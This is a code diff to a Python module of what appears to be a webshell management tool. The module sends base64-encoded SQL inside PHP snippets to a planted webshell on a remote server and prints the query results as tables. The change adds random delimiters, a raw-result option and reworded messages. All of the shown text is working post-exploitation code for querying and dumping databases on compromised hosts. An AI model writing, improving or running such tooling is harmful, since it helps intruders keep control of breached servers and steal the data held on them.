@@ -1,5 +1,5 @@
 from re import match
-
+from os import urandom
 from prettytable import PrettyTable
 
 from libs.app import readline
@@ -32,7 +32,7 @@ NEW_SQL_WORDLIST = {"common_wordlist": (
 )}
 
 
-def get_php(command, database):
+def get_php(command, database, ruid, fuid):
     connect_type = gget("db_connect_type", "webshell")
     connect_code = get_connect_code(dbname=database)
     command = base64_encode(command)
@@ -41,36 +41,46 @@ def get_php(command, database):
 $r=$con->query(base64_decode('%s'));
 $rows=$r->fetchAll(PDO::FETCH_ASSOC);
 foreach($rows[0] as $k=>$v){
-    echo "$k*,";
+    echo "$k%s";
 }
-echo "\\n";
-foreach($rows as $array){foreach($array as $k=>$v){echo "$v*,";};echo "\\n";}
+echo "%s";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v%s";};echo "%s";}
 } catch (PDOException $e){
 die("Connect error: ". $e->getMessage());
-}""" % (connect_code, command)
+}""" % (connect_code, command, fuid, ruid, fuid, ruid)
     elif (connect_type == "mysqli"):
         return """%s
 $r=$con->query(base64_decode('%s'));
 $rows=$r->fetch_all(MYSQLI_ASSOC);
 foreach($rows[0] as $k=>$v){
-    echo "$k*,";
+    echo "$k%s";
 }
-echo "\\n";
-foreach($rows as $array){foreach($array as $k=>$v){echo "$v*,";};echo "\\n";}""" % (connect_code, command)
+echo "%s";
+foreach($rows as $array){foreach($array as $k=>$v){echo "$v%s";};echo "%s";}""" % (connect_code, command, fuid, ruid, fuid, ruid)
     else:
         return ""
 
 
-def execute_sql_command(command, database):
-    res = send(get_php(command, database))
+def execute_sql_command(command, database, raw_result: bool = False):
+    ruid = "".join(hex(each)[2:].zfill(2) for each in urandom(16))
+    fuid = "," + "".join(hex(each)[2:].zfill(2)
+                         for each in urandom(12))
+    res = send(get_php(command, database, ruid, fuid))
     if (not res):
         return ''
-    rows = res.r_text.strip().split("\n")
-    if (len(rows) > 1):
-        info = rows[0].split("*,")[:-1]
+    rows = res.r_text.strip().split(ruid)
+    if (raw_result):
+        raw = []
+        for row in rows:
+            raw.append([r.strip() for r in row.split(fuid)[:-1]])
+        return raw
+    elif (len(rows) > 1):
+        info = rows[0].split(fuid)[:-1]
         form = PrettyTable(info)
         for row in rows[1:]:
-            form.add_row(row.split("*,")[:-1])
+            data = [r.strip() for r in row.split(fuid)[:-1]]
+            if(data):
+                form.add_row(data)
         return form
     return ''
 
@@ -105,19 +115,22 @@ def run():
                 continue
             if (lower_command.startswith("use ") and len(lower_command) > 4):
                 try:
-                    temp_database = match("use ([^;]*);?", lower_command).group(1)
+                    temp_database = match(
+                        "use ([^;]*);?", lower_command).group(1)
                     res = send(check_database(temp_database))
                     if ("Connect error" in res.r_text):
                         print("\n" + color.red(res.r_text.strip()) + "\n")
                     else:
                         database = temp_database
-                        print("\n" + color.green(f"Change current database: {database}") + "\n")
+                        print(
+                            "\n" + color.green(f"Change current database: {database}") + "\n")
                 except (IndexError, AttributeError):
                     print("\n" + color.red("SQL syntax error") + "\n")
             else:
                 form = execute_sql_command(command, database)
                 if (form == ''):
-                    print("\n" + color.red("Connection Error / SQL syntax error") + "\n")
+                    print(
+                        f"\n{color.green('No result')} / {color.red('Connection Error')} / {color.red('SQL syntax error')}\n")
                 else:
                     print(execute_sql_command(command, database))
     finally:
